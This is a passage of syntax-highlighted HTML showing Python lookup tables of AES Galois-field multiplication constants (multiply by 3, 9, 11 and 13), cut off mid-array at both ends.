class="number">0x7d</span>,<span class="number">0x73</span>,<span class="number">0x71</span>,<span class="number">0x77</span>,<span class="number">0x75</span>,<span class="number">0x6b</span>,<span class="number">0x69</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x67</span>,<span class="number">0x65</span>,</span><br><span class="line">    <span class="number">0x9b</span>,<span class="number">0x99</span>,<span class="number">0x9f</span>,<span class="number">0x9d</span>,<span class="number">0x93</span>,<span class="number">0x91</span>,<span class="number">0x97</span>,<span class="number">0x95</span>,<span class="number">0x8b</span>,<span class="number">0x89</span>,<span class="number">0x8f</span>,<span class="number">0x8d</span>,<span class="number">0x83</span>,<span class="number">0x81</span>,<span class="number">0x87</span>,<span class="number">0x85</span>,</span><br><span class="line">    <span class="number">0xbb</span>,<span class="number">0xb9</span>,<span class="number">0xbf</span>,<span class="number">0xbd</span>,<span class="number">0xb3</span>,<span class="number">0xb1</span>,<span class="number">0xb7</span>,<span class="number">0xb5</span>,<span class="number">0xab</span>,<span class="number">0xa9</span>,<span class="number">0xaf</span>,<span class="number">0xad</span>,<span class="number">0xa3</span>,<span class="number">0xa1</span>,<span class="number">0xa7</span>,<span class="number">0xa5</span>,</span><br><span class="line">    <span class="number">0xdb</span>,<span class="number">0xd9</span>,<span class="number">0xdf</span>,<span class="number">0xdd</span>,<span class="number">0xd3</span>,<span class="number">0xd1</span>,<span class="number">0xd7</span>,<span class="number">0xd5</span>,<span class="number">0xcb</span>,<span class="number">0xc9</span>,<span class="number">0xcf</span>,<span class="number">0xcd</span>,<span class="number">0xc3</span>,<span class="number">0xc1</span>,<span class="number">0xc7</span>,<span class="number">0xc5</span>,</span><br><span class="line">    <span class="number">0xfb</span>,<span class="number">0xf9</span>,<span class="number">0xff</span>,<span class="number">0xfd</span>,<span class="number">0xf3</span>,<span class="number">0xf1</span>,<span class="number">0xf7</span>,<span class="number">0xf5</span>,<span class="number">0xeb</span>,<span class="number">0xe9</span>,<span class="number">0xef</span>,<span class="number">0xed</span>,<span class="number">0xe3</span>,<span class="number">0xe1</span>,<span class="number">0xe7</span>,<span class="number">0xe5</span>]</span><br><span class="line"></span><br><span class="line">GF_MULT_3 = [</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x06</span>,<span class="number">0x05</span>,<span class="number">0x0c</span>,<span class="number">0x0f</span>,<span class="number">0x0a</span>,<span class="number">0x09</span>,<span class="number">0x18</span>,<span class="number">0x1b</span>,<span class="number">0x1e</span>,<span class="number">0x1d</span>,<span class="number">0x14</span>,<span class="number">0x17</span>,<span class="number">0x12</span>,<span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x30</span>,<span class="number">0x33</span>,<span class="number">0x36</span>,<span class="number">0x35</span>,<span class="number">0x3c</span>,<span class="number">0x3f</span>,<span class="number">0x3a</span>,<span class="number">0x39</span>,<span class="number">0x28</span>,<span class="number">0x2b</span>,<span class="number">0x2e</span>,<span class="number">0x2d</span>,<span class="number">0x24</span>,<span class="number">0x27</span>,<span class="number">0x22</span>,<span class="number">0x21</span>,</span><br><span class="line">    <span class="number">0x60</span>,<span class="number">0x63</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x6c</span>,<span class="number">0x6f</span>,<span class="number">0x6a</span>,<span class="number">0x69</span>,<span class="number">0x78</span>,<span class="number">0x7b</span>,<span class="number">0x7e</span>,<span class="number">0x7d</span>,<span class="number">0x74</span>,<span class="number">0x77</span>,<span class="number">0x72</span>,<span class="number">0x71</span>,</span><br><span class="line">    <span class="number">0x50</span>,<span class="number">0x53</span>,<span class="number">0x56</span>,<span class="number">0x55</span>,<span class="number">0x5c</span>,<span class="number">0x5f</span>,<span class="number">0x5a</span>,<span class="number">0x59</span>,<span class="number">0x48</span>,<span class="number">0x4b</span>,<span class="number">0x4e</span>,<span class="number">0x4d</span>,<span class="number">0x44</span>,<span class="number">0x47</span>,<span class="number">0x42</span>,<span class="number">0x41</span>,</span><br><span class="line">    <span class="number">0xc0</span>,<span class="number">0xc3</span>,<span class="number">0xc6</span>,<span class="number">0xc5</span>,<span class="number">0xcc</span>,<span class="number">0xcf</span>,<span class="number">0xca</span>,<span class="number">0xc9</span>,<span class="number">0xd8</span>,<span class="number">0xdb</span>,<span class="number">0xde</span>,<span class="number">0xdd</span>,<span class="number">0xd4</span>,<span class="number">0xd7</span>,<span class="number">0xd2</span>,<span class="number">0xd1</span>,</span><br><span class="line">    <span class="number">0xf0</span>,<span class="number">0xf3</span>,<span class="number">0xf6</span>,<span class="number">0xf5</span>,<span class="number">0xfc</span>,<span class="number">0xff</span>,<span class="number">0xfa</span>,<span class="number">0xf9</span>,<span class="number">0xe8</span>,<span class="number">0xeb</span>,<span class="number">0xee</span>,<span class="number">0xed</span>,<span class="number">0xe4</span>,<span class="number">0xe7</span>,<span class="number">0xe2</span>,<span class="number">0xe1</span>,</span><br><span class="line">    <span class="number">0xa0</span>,<span class="number">0xa3</span>,<span class="number">0xa6</span>,<span class="number">0xa5</span>,<span class="number">0xac</span>,<span class="number">0xaf</span>,<span class="number">0xaa</span>,<span class="number">0xa9</span>,<span class="number">0xb8</span>,<span class="number">0xbb</span>,<span class="number">0xbe</span>,<span class="number">0xbd</span>,<span class="number">0xb4</span>,<span class="number">0xb7</span>,<span class="number">0xb2</span>,<span class="number">0xb1</span>,</span><br><span class="line">    <span class="number">0x90</span>,<span class="number">0x93</span>,<span class="number">0x96</span>,<span class="number">0x95</span>,<span class="number">0x9c</span>,<span class="number">0x9f</span>,<span class="number">0x9a</span>,<span class="number">0x99</span>,<span class="number">0x88</span>,<span class="number">0x8b</span>,<span class="number">0x8e</span>,<span class="number">0x8d</span>,<span class="number">0x84</span>,<span class="number">0x87</span>,<span class="number">0x82</span>,<span class="number">0x81</span>,</span><br><span class="line">    <span class="number">0x9b</span>,<span class="number">0x98</span>,<span class="number">0x9d</span>,<span class="number">0x9e</span>,<span class="number">0x97</span>,<span class="number">0x94</span>,<span class="number">0x91</span>,<span class="number">0x92</span>,<span class="number">0x83</span>,<span class="number">0x80</span>,<span class="number">0x85</span>,<span class="number">0x86</span>,<span class="number">0x8f</span>,<span class="number">0x8c</span>,<span class="number">0x89</span>,<span class="number">0x8a</span>,</span><br><span class="line">    <span class="number">0xab</span>,<span class="number">0xa8</span>,<span class="number">0xad</span>,<span class="number">0xae</span>,<span class="number">0xa7</span>,<span class="number">0xa4</span>,<span class="number">0xa1</span>,<span class="number">0xa2</span>,<span class="number">0xb3</span>,<span class="number">0xb0</span>,<span class="number">0xb5</span>,<span class="number">0xb6</span>,<span class="number">0xbf</span>,<span class="number">0xbc</span>,<span class="number">0xb9</span>,<span class="number">0xba</span>,</span><br><span class="line">    <span class="number">0xfb</span>,<span class="number">0xf8</span>,<span class="number">0xfd</span>,<span class="number">0xfe</span>,<span class="number">0xf7</span>,<span class="number">0xf4</span>,<span class="number">0xf1</span>,<span class="number">0xf2</span>,<span class="number">0xe3</span>,<span class="number">0xe0</span>,<span class="number">0xe5</span>,<span class="number">0xe6</span>,<span class="number">0xef</span>,<span class="number">0xec</span>,<span class="number">0xe9</span>,<span class="number">0xea</span>,</span><br><span class="line">    <span class="number">0xcb</span>,<span class="number">0xc8</span>,<span class="number">0xcd</span>,<span class="number">0xce</span>,<span class="number">0xc7</span>,<span class="number">0xc4</span>,<span class="number">0xc1</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xd0</span>,<span class="number">0xd5</span>,<span class="number">0xd6</span>,<span class="number">0xdf</span>,<span class="number">0xdc</span>,<span class="number">0xd9</span>,<span class="number">0xda</span>,</span><br><span class="line">    <span class="number">0x5b</span>,<span class="number">0x58</span>,<span class="number">0x5d</span>,<span class="number">0x5e</span>,<span class="number">0x57</span>,<span class="number">0x54</span>,<span class="number">0x51</span>,<span class="number">0x52</span>,<span class="number">0x43</span>,<span class="number">0x40</span>,<span class="number">0x45</span>,<span class="number">0x46</span>,<span class="number">0x4f</span>,<span class="number">0x4c</span>,<span class="number">0x49</span>,<span class="number">0x4a</span>,</span><br><span class="line">    <span class="number">0x6b</span>,<span class="number">0x68</span>,<span class="number">0x6d</span>,<span class="number">0x6e</span>,<span class="number">0x67</span>,<span class="number">0x64</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x73</span>,<span class="number">0x70</span>,<span class="number">0x75</span>,<span class="number">0x76</span>,<span class="number">0x7f</span>,<span class="number">0x7c</span>,<span class="number">0x79</span>,<span class="number">0x7a</span>,</span><br><span class="line">    <span class="number">0x3b</span>,<span class="number">0x38</span>,<span class="number">0x3d</span>,<span class="number">0x3e</span>,<span class="number">0x37</span>,<span class="number">0x34</span>,<span class="number">0x31</span>,<span class="number">0x32</span>,<span class="number">0x23</span>,<span class="number">0x20</span>,<span class="number">0x25</span>,<span class="number">0x26</span>,<span class="number">0x2f</span>,<span class="number">0x2c</span>,<span class="number">0x29</span>,<span class="number">0x2a</span>,</span><br><span class="line">    <span class="number">0x0b</span>,<span class="number">0x08</span>,<span class="number">0x0d</span>,<span class="number">0x0e</span>,<span class="number">0x07</span>,<span class="number">0x04</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x13</span>,<span class="number">0x10</span>,<span class="number">0x15</span>,<span class="number">0x16</span>,<span class="number">0x1f</span>,<span class="number">0x1c</span>,<span class="number">0x19</span>,<span class="number">0x1a</span>]</span><br><span class="line"></span><br><span class="line">GF_MULT_09 = [</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x09</span>,<span class="number">0x12</span>,<span class="number">0x1b</span>,<span class="number">0x24</span>,<span class="number">0x2d</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0x48</span>,<span class="number">0x41</span>,<span class="number">0x5a</span>,<span class="number">0x53</span>,<span class="number">0x6c</span>,<span class="number">0x65</span>,<span class="number">0x7e</span>,<span class="number">0x77</span>,</span><br><span class="line">    <span class="number">0x90</span>,<span class="number">0x99</span>,<span class="number">0x82</span>,<span class="number">0x8b</span>,<span class="number">0xb4</span>,<span class="number">0xbd</span>,<span class="number">0xa6</span>,<span class="number">0xaf</span>,<span class="number">0xd8</span>,<span class="number">0xd1</span>,<span class="number">0xca</span>,<span class="number">0xc3</span>,<span class="number">0xfc</span>,<span class="number">0xf5</span>,<span class="number">0xee</span>,<span class="number">0xe7</span>,</span><br><span class="line">    <span class="number">0x3b</span>,<span class="number">0x32</span>,<span class="number">0x29</span>,<span class="number">0x20</span>,<span class="number">0x1f</span>,<span class="number">0x16</span>,<span class="number">0x0d</span>,<span class="number">0x04</span>,<span class="number">0x73</span>,<span class="number">0x7a</span>,<span class="number">0x61</span>,<span class="number">0x68</span>,<span class="number">0x57</span>,<span class="number">0x5e</span>,<span class="number">0x45</span>,<span class="number">0x4c</span>,</span><br><span class="line">    <span class="number">0xab</span>,<span class="number">0xa2</span>,<span class="number">0xb9</span>,<span class="number">0xb0</span>,<span class="number">0x8f</span>,<span class="number">0x86</span>,<span class="number">0x9d</span>,<span class="number">0x94</span>,<span class="number">0xe3</span>,<span class="number">0xea</span>,<span class="number">0xf1</span>,<span class="number">0xf8</span>,<span class="number">0xc7</span>,<span class="number">0xce</span>,<span class="number">0xd5</span>,<span class="number">0xdc</span>,</span><br><span class="line">    <span class="number">0x76</span>,<span class="number">0x7f</span>,<span class="number">0x64</span>,<span class="number">0x6d</span>,<span class="number">0x52</span>,<span class="number">0x5b</span>,<span class="number">0x40</span>,<span class="number">0x49</span>,<span class="number">0x3e</span>,<span class="number">0x37</span>,<span class="number">0x2c</span>,<span class="number">0x25</span>,<span class="number">0x1a</span>,<span class="number">0x13</span>,<span class="number">0x08</span>,<span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0xe6</span>,<span class="number">0xef</span>,<span class="number">0xf4</span>,<span class="number">0xfd</span>,<span class="number">0xc2</span>,<span class="number">0xcb</span>,<span class="number">0xd0</span>,<span class="number">0xd9</span>,<span class="number">0xae</span>,<span class="number">0xa7</span>,<span class="number">0xbc</span>,<span class="number">0xb5</span>,<span class="number">0x8a</span>,<span class="number">0x83</span>,<span class="number">0x98</span>,<span class="number">0x91</span>,</span><br><span class="line">    <span class="number">0x4d</span>,<span class="number">0x44</span>,<span class="number">0x5f</span>,<span class="number">0x56</span>,<span class="number">0x69</span>,<span class="number">0x60</span>,<span class="number">0x7b</span>,<span class="number">0x72</span>,<span class="number">0x05</span>,<span class="number">0x0c</span>,<span class="number">0x17</span>,<span class="number">0x1e</span>,<span class="number">0x21</span>,<span class="number">0x28</span>,<span class="number">0x33</span>,<span class="number">0x3a</span>,</span><br><span class="line">    <span class="number">0xdd</span>,<span class="number">0xd4</span>,<span class="number">0xcf</span>,<span class="number">0xc6</span>,<span class="number">0xf9</span>,<span class="number">0xf0</span>,<span class="number">0xeb</span>,<span class="number">0xe2</span>,<span class="number">0x95</span>,<span class="number">0x9c</span>,<span class="number">0x87</span>,<span class="number">0x8e</span>,<span class="number">0xb1</span>,<span class="number">0xb8</span>,<span class="number">0xa3</span>,<span class="number">0xaa</span>,</span><br><span class="line">    <span class="number">0xec</span>,<span class="number">0xe5</span>,<span class="number">0xfe</span>,<span class="number">0xf7</span>,<span class="number">0xc8</span>,<span class="number">0xc1</span>,<span class="number">0xda</span>,<span class="number">0xd3</span>,<span class="number">0xa4</span>,<span class="number">0xad</span>,<span class="number">0xb6</span>,<span class="number">0xbf</span>,<span class="number">0x80</span>,<span class="number">0x89</span>,<span class="number">0x92</span>,<span class="number">0x9b</span>,</span><br><span class="line">    <span class="number">0x7c</span>,<span class="number">0x75</span>,<span class="number">0x6e</span>,<span class="number">0x67</span>,<span class="number">0x58</span>,<span class="number">0x51</span>,<span class="number">0x4a</span>,<span class="number">0x43</span>,<span class="number">0x34</span>,<span class="number">0x3d</span>,<span class="number">0x26</span>,<span class="number">0x2f</span>,<span class="number">0x10</span>,<span class="number">0x19</span>,<span class="number">0x02</span>,<span class="number">0x0b</span>,</span><br><span class="line">    <span class="number">0xd7</span>,<span class="number">0xde</span>,<span class="number">0xc5</span>,<span class="number">0xcc</span>,<span class="number">0xf3</span>,<span class="number">0xfa</span>,<span class="number">0xe1</span>,<span class="number">0xe8</span>,<span class="number">0x9f</span>,<span class="number">0x96</span>,<span class="number">0x8d</span>,<span class="number">0x84</span>,<span class="number">0xbb</span>,<span class="number">0xb2</span>,<span class="number">0xa9</span>,<span class="number">0xa0</span>,</span><br><span class="line">    <span class="number">0x47</span>,<span class="number">0x4e</span>,<span class="number">0x55</span>,<span class="number">0x5c</span>,<span class="number">0x63</span>,<span class="number">0x6a</span>,<span class="number">0x71</span>,<span class="number">0x78</span>,<span class="number">0x0f</span>,<span class="number">0x06</span>,<span class="number">0x1d</span>,<span class="number">0x14</span>,<span class="number">0x2b</span>,<span class="number">0x22</span>,<span class="number">0x39</span>,<span class="number">0x30</span>,</span><br><span class="line">    <span class="number">0x9a</span>,<span class="number">0x93</span>,<span class="number">0x88</span>,<span class="number">0x81</span>,<span class="number">0xbe</span>,<span class="number">0xb7</span>,<span class="number">0xac</span>,<span class="number">0xa5</span>,<span class="number">0xd2</span>,<span class="number">0xdb</span>,<span class="number">0xc0</span>,<span class="number">0xc9</span>,<span class="number">0xf6</span>,<span class="number">0xff</span>,<span class="number">0xe4</span>,<span class="number">0xed</span>,</span><br><span class="line">    <span class="number">0x0a</span>,<span class="number">0x03</span>,<span class="number">0x18</span>,<span class="number">0x11</span>,<span class="number">0x2e</span>,<span class="number">0x27</span>,<span class="number">0x3c</span>,<span class="number">0x35</span>,<span class="number">0x42</span>,<span class="number">0x4b</span>,<span class="number">0x50</span>,<span class="number">0x59</span>,<span class="number">0x66</span>,<span class="number">0x6f</span>,<span class="number">0x74</span>,<span class="number">0x7d</span>,</span><br><span class="line">    <span class="number">0xa1</span>,<span class="number">0xa8</span>,<span class="number">0xb3</span>,<span class="number">0xba</span>,<span class="number">0x85</span>,<span class="number">0x8c</span>,<span class="number">0x97</span>,<span class="number">0x9e</span>,<span class="number">0xe9</span>,<span class="number">0xe0</span>,<span class="number">0xfb</span>,<span class="number">0xf2</span>,<span class="number">0xcd</span>,<span class="number">0xc4</span>,<span class="number">0xdf</span>,<span class="number">0xd6</span>,</span><br><span class="line">    <span class="number">0x31</span>,<span class="number">0x38</span>,<span class="number">0x23</span>,<span class="number">0x2a</span>,<span class="number">0x15</span>,<span class="number">0x1c</span>,<span class="number">0x07</span>,<span class="number">0x0e</span>,<span class="number">0x79</span>,<span class="number">0x70</span>,<span class="number">0x6b</span>,<span class="number">0x62</span>,<span class="number">0x5d</span>,<span class="number">0x54</span>,<span class="number">0x4f</span>,<span class="number">0x46</span>]</span><br><span class="line"></span><br><span class="line">GF_MULT_11 = [</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x0b</span>,<span class="number">0x16</span>,<span class="number">0x1d</span>,<span class="number">0x2c</span>,<span class="number">0x27</span>,<span class="number">0x3a</span>,<span class="number">0x31</span>,<span class="number">0x58</span>,<span class="number">0x53</span>,<span class="number">0x4e</span>,<span class="number">0x45</span>,<span class="number">0x74</span>,<span class="number">0x7f</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,</span><br><span class="line">    <span class="number">0xb0</span>,<span class="number">0xbb</span>,<span class="number">0xa6</span>,<span class="number">0xad</span>,<span class="number">0x9c</span>,<span class="number">0x97</span>,<span class="number">0x8a</span>,<span class="number">0x81</span>,<span class="number">0xe8</span>,<span class="number">0xe3</span>,<span class="number">0xfe</span>,<span class="number">0xf5</span>,<span class="number">0xc4</span>,<span class="number">0xcf</span>,<span class="number">0xd2</span>,<span class="number">0xd9</span>,</span><br><span class="line">    <span class="number">0x7b</span>,<span class="number">0x70</span>,<span class="number">0x6d</span>,<span class="number">0x66</span>,<span class="number">0x57</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x4a</span>,<span class="number">0x23</span>,<span class="number">0x28</span>,<span class="number">0x35</span>,<span class="number">0x3e</span>,<span class="number">0x0f</span>,<span class="number">0x04</span>,<span class="number">0x19</span>,<span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0xcb</span>,<span class="number">0xc0</span>,<span class="number">0xdd</span>,<span class="number">0xd6</span>,<span class="number">0xe7</span>,<span class="number">0xec</span>,<span class="number">0xf1</span>,<span class="number">0xfa</span>,<span class="number">0x93</span>,<span class="number">0x98</span>,<span class="number">0x85</span>,<span class="number">0x8e</span>,<span class="number">0xbf</span>,<span class="number">0xb4</span>,<span class="number">0xa9</span>,<span class="number">0xa2</span>,</span><br><span class="line">    <span class="number">0xf6</span>,<span class="number">0xfd</span>,<span class="number">0xe0</span>,<span class="number">0xeb</span>,<span class="number">0xda</span>,<span class="number">0xd1</span>,<span class="number">0xcc</span>,<span class="number">0xc7</span>,<span class="number">0xae</span>,<span class="number">0xa5</span>,<span class="number">0xb8</span>,<span class="number">0xb3</span>,<span class="number">0x82</span>,<span class="number">0x89</span>,<span class="number">0x94</span>,<span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x46</span>,<span class="number">0x4d</span>,<span class="number">0x50</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0x61</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x1e</span>,<span class="number">0x15</span>,<span class="number">0x08</span>,<span class="number">0x03</span>,<span class="number">0x32</span>,<span class="number">0x39</span>,<span class="number">0x24</span>,<span class="number">0x2f</span>,</span><br><span class="line">    <span class="number">0x8d</span>,<span class="number">0x86</span>,<span class="number">0x9b</span>,<span class="number">0x90</span>,<span class="number">0xa1</span>,<span class="number">0xaa</span>,<span class="number">0xb7</span>,<span class="number">0xbc</span>,<span class="number">0xd5</span>,<span class="number">0xde</span>,<span class="number">0xc3</span>,<span class="number">0xc8</span>,<span class="number">0xf9</span>,<span class="number">0xf2</span>,<span class="number">0xef</span>,<span class="number">0xe4</span>,</span><br><span class="line">    <span class="number">0x3d</span>,<span class="number">0x36</span>,<span class="number">0x2b</span>,<span class="number">0x20</span>,<span class="number">0x11</span>,<span class="number">0x1a</span>,<span class="number">0x07</span>,<span class="number">0x0c</span>,<span class="number">0x65</span>,<span class="number">0x6e</span>,<span class="number">0x73</span>,<span class="number">0x78</span>,<span class="number">0x49</span>,<span class="number">0x42</span>,<span class="number">0x5f</span>,<span class="number">0x54</span>,</span><br><span class="line">    <span class="number">0xf7</span>,<span class="number">0xfc</span>,<span class="number">0xe1</span>,<span class="number">0xea</span>,<span class="number">0xdb</span>,<span class="number">0xd0</span>,<span class="number">0xcd</span>,<span class="number">0xc6</span>,<span class="number">0xaf</span>,<span class="number">0xa4</span>,<span class="number">0xb9</span>,<span class="number">0xb2</span>,<span class="number">0x83</span>,<span class="number">0x88</span>,<span class="number">0x95</span>,<span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0x47</span>,<span class="number">0x4c</span>,<span class="number">0x51</span>,<span class="number">0x5a</span>,<span class="number">0x6b</span>,<span class="number">0x60</span>,<span class="number">0x7d</span>,<span class="number">0x76</span>,<span class="number">0x1f</span>,<span class="number">0x14</span>,<span class="number">0x09</span>,<span class="number">0x02</span>,<span class="number">0x33</span>,<span class="number">0x38</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,</span><br><span class="line">    <span class="number">0x8c</span>,<span class="number">0x87</span>,<span class="number">0x9a</span>,<span class="number">0x91</span>,<span class="number">0xa0</span>,<span class="number">0xab</span>,<span class="number">0xb6</span>,<span class="number">0xbd</span>,<span class="number">0xd4</span>,<span class="number">0xdf</span>,<span class="number">0xc2</span>,<span class="number">0xc9</span>,<span class="number">0xf8</span>,<span class="number">0xf3</span>,<span class="number">0xee</span>,<span class="number">0xe5</span>,</span><br><span class="line">    <span class="number">0x3c</span>,<span class="number">0x37</span>,<span class="number">0x2a</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0x1b</span>,<span class="number">0x06</span>,<span class="number">0x0d</span>,<span class="number">0x64</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>,<span class="number">0x79</span>,<span class="number">0x48</span>,<span class="number">0x43</span>,<span class="number">0x5e</span>,<span class="number">0x55</span>,</span><br><span class="line">    <span class="number">0x01</span>,<span class="number">0x0a</span>,<span class="number">0x17</span>,<span class="number">0x1c</span>,<span class="number">0x2d</span>,<span class="number">0x26</span>,<span class="number">0x3b</span>,<span class="number">0x30</span>,<span class="number">0x59</span>,<span class="number">0x52</span>,<span class="number">0x4f</span>,<span class="number">0x44</span>,<span class="number">0x75</span>,<span class="number">0x7e</span>,<span class="number">0x63</span>,<span class="number">0x68</span>,</span><br><span class="line">    <span class="number">0xb1</span>,<span class="number">0xba</span>,<span class="number">0xa7</span>,<span class="number">0xac</span>,<span class="number">0x9d</span>,<span class="number">0x96</span>,<span class="number">0x8b</span>,<span class="number">0x80</span>,<span class="number">0xe9</span>,<span class="number">0xe2</span>,<span class="number">0xff</span>,<span class="number">0xf4</span>,<span class="number">0xc5</span>,<span class="number">0xce</span>,<span class="number">0xd3</span>,<span class="number">0xd8</span>,</span><br><span class="line">    <span class="number">0x7a</span>,<span class="number">0x71</span>,<span class="number">0x6c</span>,<span class="number">0x67</span>,<span class="number">0x56</span>,<span class="number">0x5d</span>,<span class="number">0x40</span>,<span class="number">0x4b</span>,<span class="number">0x22</span>,<span class="number">0x29</span>,<span class="number">0x34</span>,<span class="number">0x3f</span>,<span class="number">0x0e</span>,<span class="number">0x05</span>,<span class="number">0x18</span>,<span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0xca</span>,<span class="number">0xc1</span>,<span class="number">0xdc</span>,<span class="number">0xd7</span>,<span class="number">0xe6</span>,<span class="number">0xed</span>,<span class="number">0xf0</span>,<span class="number">0xfb</span>,<span class="number">0x92</span>,<span class="number">0x99</span>,<span class="number">0x84</span>,<span class="number">0x8f</span>,<span class="number">0xbe</span>,<span class="number">0xb5</span>,<span class="number">0xa8</span>,<span class="number">0xa3</span>]</span><br><span class="line"></span><br><span class="line">GF_MULT_13 = [</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x0d</span>,<span class="number">0x1a</span>,<span class="number">0x17</span>,<span class="number">0x34</span>,<span class="number">0x39</span>,<span class="number">0x2e</span>,<span class="number">0x23</span>,<span class="number">0x68</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x7f</span>,<span class="number">0x5c</span>,<span class="number">0x51</span>,<span class="number">0x46</span>,<span class="number">0x4b</span>,</span><br><span class="line">    <span class="number">0xd0</span>,<span class="number">0xdd</span>,<span class="number">0xca</span>,<span class="number">0xc7</span>,<span class="number">0xe4</span>,<span class="number">0xe9</span>,<span class="number">0xfe</span>,<span class="number">0xf3</span>,<span class="number">0xb8</span>,<span class="number">0xb5</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x8c</span>,<span class="number">0x81</span>,<span class="number">0x96</span>,<span class="number">0x9b</span>,</span><br><span class="line">    <span class="number">0xbb</span>,<span class="number">0xb6</span>,<span class="number">0xa1</span>,<span class="number">0xac</span>,<span class="number">0x8f</span>,<span class="number">0x82</span>,<span class="number">0x95</span>,<span class="number">0x98</span>,<span class="number">0xd3</span>,<span class="number">0xde</span>,<span class="number">0xc9</span>,<span class="number">0xc4</span>,<span class="number">0xe7</span>,<span class="number">0xea</span>,<span class="number">0xfd</span>,<span class="number">0xf0</span>,</span><br><span class="line">    <span class="number">0x6b</span>,<span class="number">0x66</span>,<span class="number">0x71</span>,<span class="number">0x7c</span>,<span class="number">0x5f</span>,<span class="number">0x52</span>,<span class="number">0x45</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0x0e</span>,<span class="number">0x19</span>,<span class="number">0x14</span>,<span class="number">0x37</span>,<span class="number">0x3a</span>,<span class="number">0x2d</span>,<span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x6d</span>,<span class="number">0x60</span>,<span class="number">0x77</span>,<span class="number">0x7a</span>,<span class="number">0x59</span>,<span class="number">0x54</span>,<span class="number">0x43</span>,<span class="number">0x4e</span>,<span class="number">0x05</span>,<span class="number">0x08</span>,<span class="number">0x1f</span>,<span class="number">0x12</span>,<span class="number">0x31</span>,<span class="number">0x3c</span>,<span class="number">0x2b</span>,<span class="number">0x26</span>,</span><br><span class="line">    <span class="number">0xbd</span>,<span class="number">0xb0</span>,<span class="number">0xa7</span>,<span class="number">0xaa</span>,<span class="number">0x89</span>,<span class="number">0x84</span>,<span class="number">0x93</span>,<span class="number">0x9e</span>,<span class="number">0xd5</span>,<span class="number">0xd8</span>,<span class="number">0xcf</span>,<span class="number">0xc2</span>,<span class="number">0xe1</span>,<span class="number">0xec</span>,<span class="number">0xfb</span>,<span class="number">0xf6</span>,</span><br><span class="line">    <span class="number">0xd6</span>,<span class="number">0xdb</span>,<span class="number">0xcc</span>,<span class="number">0xc1</span>,<span class="number">0xe2</span>,<span class="number">0xef</span>,<span class="number">0xf8</span>,<span class="number">0xf5</span>,<span class="number">0xbe</span>,<span class="number">0xb3</span>,<span class="number">0xa4</span>,<span class="number">0xa9</span>,<span class="number">0x8a</span>,<span class="number">0x87</span>,<span class="number">0x90</span>,<span class="number">0x9d</span>,</span><br><span class="line">    <span class="number">0x06</span>,<span class="number">0x0b</span>,<span class="number">0x1c</span>,<span class="number">0x11</span>,<span class="number">0x32</span>,<span class="number">0x3f</span>,<span class="number">0x28</span>,<span class="number">0x25</span>,<span class="number">0x6e</span>,<span class="number">0x63</span>,<span class="number">0x74</span>,<span class="number">0x79</span>,<span class="number">0x5a</span>,<span class="number">0x57</span>,<span class="number">0x40</span>,<span class="number">0x4d</span>,</span><br><span class="line">    <span class="number">0xda</span>,<span class="number">0xd7</span>,<span class="number">0xc0</span>,<span class="number">0xcd</span>,<span class="number">0xee</span>,<span class="number">0xe3</span>,<span class="number">0xf4</span>,<span class="number">0xf9</span>,<span class="number">0xb2</span>,<span class="number">0xbf</span>,<span class="number">0xa8</span>,<span class="number">0xa5</span>,<span class="number">0x86</span>,<span class="number">0x8b</span>,<span class="number">0x9c</span>,<span class="number">0x91</span>,</span><br><span class="line">    <span class="number">0x0a</span>,<span class="number">0x07</span>,<span class="number">0x10</span>,<span class="number">0x1d</span>,<span class="number">0x3e</span>,<span class="number">0x33</span>,<span class="number">0x24</span>,<span class="number">0x29</span>,<span class="number">0x62</span>,<span class="number">0x6f</span>,<span class="number">0x78</span>,<span class="number">0x75</span>,<span class="number">0x56</span>,<span class="number">0x5b</span>,<span class="number">0x4c</span>,<span class="number">0x41</span>,</span><br><span class="line">    <span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x7b</span>,<span class="number">0x76</span>,<span class="number">0x55</span>,<span class="number">0x58</span>,<span class="number">0x4f</span>,<span class="number">0x42</span>,<span class="number">0x09</span>,<span class="number">0x04</span>,<span class="number">0x13</span>,<span class="number">0x1e</span>,<span class="number">0x3d</span>,<span class="number">0x30</span>,<span class="number">0x27</span>,<span class="number">0x2a</span>,</span><br><span class="line">    <span class="number">0xb1</span>,<span class="number">0xbc</span>,<span class="number">0xab</span>,<span class="number">0xa6</span>,<span class="number">0x85</span>,<span class="number">0x88</span>,<span class="number">0x9f</span>,<span class="number">0x92</span>,<span class="number">0xd9</span>,<span class="number">0xd4</span>,<span class="number">0xc3</span>,<span class="number">0xce</span>,<span class="number">0xed</span>,<span class="number">0xe0</span>,<span class="number">0xf7</span>,<span class="number">0xfa</span>,</span><br><span class="line">    <span class="number">0xb7</span>,<span class="number">0xba</span>,<span class="number">0xad</span>,<span class="number">0xa0</span>,<span class="number">0x83</span>,<span class="number">0x8e</span>,<span class="number">0x99</span>,<span 